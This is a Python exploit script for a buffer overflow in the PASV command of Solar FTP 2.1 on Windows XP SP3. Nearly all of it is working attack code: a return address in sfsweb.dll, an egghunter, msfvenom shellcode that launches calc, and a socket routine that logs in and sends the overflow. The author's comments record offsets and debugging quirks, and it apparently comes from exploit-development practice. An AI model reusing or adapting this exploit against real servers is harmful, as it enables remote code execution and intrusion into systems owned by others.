#!/usr/bin/python3
# Solar FTP 2.1 PASV Buffer Overflow
# Tested on Windows XP SP3

import socket
import struct
import time
import subprocess

target_ip = "192.168.1.180"
target_port = 21

def make_string(offset):
    # test strings
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" % offset
    #junk = subprocess.check_output(cmd, shell=True)
    # standard egghunter
    egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # msfvenom -p windows/exec CMD="calc" EXITFUNC=seh -f python -b "\x00"
    buf =  b"w00tw00t"
    buf += b"\xdb\xd5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb8\xbc\x41\x69"
    buf += b"\x2a\xb1\x30\x83\xea\xfc\x31\x42\x14\x03\x42\xa8\xa3"
    buf += b"\x9c\xd6\x38\xa1\x5f\x27\xb8\xc6\xd6\xc2\x89\xc6\x8d"
    buf += b"\x87\xb9\xf6\xc6\xca\x35\x7c\x8a\xfe\xce\xf0\x03\xf0"
    buf += b"\x67\xbe\x75\x3f\x78\x93\x46\x5e\xfa\xee\x9a\x80\xc3"
    buf += b"\x20\xef\xc1\x04\x5c\x02\x93\xdd\x2a\xb1\x04\x6a\x66"
    buf += b"\x0a\xae\x20\x66\x0a\x53\xf0\x89\x3b\xc2\x8b\xd3\x9b"
    buf += b"\xe4\x58\x68\x92\xfe\xbd\x55\x6c\x74\x75\x21\x6f\x5c"
    buf += b"\x44\xca\xdc\xa1\x69\x39\x1c\xe5\x4d\xa2\x6b\x1f\xae"
    buf += b"\x5f\x6c\xe4\xcd\xbb\xf9\xff\x75\x4f\x59\x24\x84\x9c"
    buf += b"\x3c\xaf\x8a\x69\x4a\xf7\x8e\x6c\x9f\x83\xaa\xe5\x1e"
    buf += b"\x44\x3b\xbd\x04\x40\x60\x65\x24\xd1\xcc\xc8\x59\x01"
    buf += b"\xaf\xb5\xff\x49\x5d\xa1\x8d\x13\x0b\x34\x03\x2e\x79"
    buf += b"\x36\x1b\x31\x2d\x5f\x2a\xba\xa2\x18\xb3\x69\x87\xd9"
    buf += b"\x42\xa0\x1d\x4d\xfd\x51\x5c\x13\xfe\x8f\xa2\x2a\x7d"
    buf += b"\x3a\x5a\xc9\x9d\x4f\x5f\x95\x19\xa3\x2d\x86\xcf\xc3"
    buf += b"\x82\xa7\xc5\xa7\x45\x34\x85\x27"
    # must have NOPS, there's some junk right at EAX but execution will continue
    # actual NOPs mess up execution, A's work though
    nops = b"A"*24
    # JMP EAX found at 0x1001bd23 in sfsweb.dll
    # Inspection of registers at crash shows code starting a few bytes after EAX
    eip = struct.pack("<I", 0x1001bd23)
    # appended with 2000 chars, a buffer any longer than 3050 bytes didn't produce a crash for me
    # shorter buffer length (1000-2000) gave a different offset of 69
    # ascii_shrug_guy.jpg.gif
    junk = nops + egghunter + b"A"*(offset - len(egghunter) - len(nops)) + eip + buf+ b"C"*(2500- len(buf))
    crash_string = junk.strip()
    print(crash_string)
    return crash_string

def exploit(crash_string):
    # Application is finicky in the debugger, that's why I had the print strings in there to make sure
    # is was working without looking at wireshark
    print("Making server...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    print("Sending user...")
    s.send(b"USER test\r\n")
    response = s.recv(2048)
    print(response.decode())
    print("Sending pass...")
    s.send(b"PASS test\r\n")
    response = s.recv(2048)
    print(response.decode())
    # I don't know why but this was necessary, sequencing got wonky unless I slowed everything down
    time.sleep(5)
    print("Sending PASV")
    s.send(b"PASV " + crash_string + b"\r\n")
    response = s.recv(2048)
    print(response.decode())
    s.close()

def main():
    # offset is found at 123
    offset = 123
    crash_string = make_string(offset)
    exploit(crash_string)

if __name__ == "__main__":
    main()
